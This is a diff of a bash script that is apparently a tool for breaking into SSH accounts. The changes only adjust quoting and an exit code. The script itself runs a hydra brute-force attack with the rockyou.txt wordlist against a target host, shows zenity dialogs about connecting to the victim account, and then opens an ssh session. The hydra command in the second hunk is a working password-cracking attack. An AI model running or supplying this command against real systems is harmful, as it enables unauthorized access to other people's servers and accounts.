@@ -6,7 +6,7 @@ source DontEdit.sh
 #checks if the user is connected to ssh and if they are it makes the program not work
 if [ -n "$SSH_CLIENT" ]; then
     echo "Connected via SSH"
-    exit 0
+    exit 1
 else
     echo "Not connected via SSH"
 fi
@@ -251,7 +251,7 @@ else
                         Hercules
                     else
                         # Cracks SSH Passwords
-                        hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host"
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host"
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
@@ -263,7 +263,7 @@ else
                         Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         zenity --info --title="${title}" --text="${Connected_To_SSH_SERVER}"
 
-                        ssh "$user"@"$host"
+                        ssh "${user}"@"${host}"
                     fi
                 fi
             }
